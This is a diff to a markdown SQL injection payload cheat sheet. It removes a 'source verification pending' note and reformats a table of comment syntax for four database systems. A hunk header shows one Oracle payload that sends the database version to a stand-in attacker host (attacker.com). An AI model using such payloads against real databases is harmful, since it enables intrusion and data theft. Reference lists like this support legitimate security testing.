@@ -1,7 +1,5 @@
 # 💉 SQL Injection Payloads
 
-> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.
-
 ```
   ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
   ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
@@ -544,10 +542,10 @@ SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
 
 | DBMS | Comments |
 |------|----------|
-| MySQL | <code>--&nbsp;</code>, `#`, `/* */` |
-| PostgreSQL | <code>--&nbsp;</code>, `/* */` |
-| MSSQL | <code>--&nbsp;</code>, `/* */` |
-| Oracle | <code>--&nbsp;</code>, `/* */` |
+| MySQL | `-- `, `#`, `/* */` |
+| PostgreSQL | `-- `, `/* */` |
+| MSSQL | `-- `, `/* */` |
+| Oracle | `-- `, `/* */` |
 
 ---
 
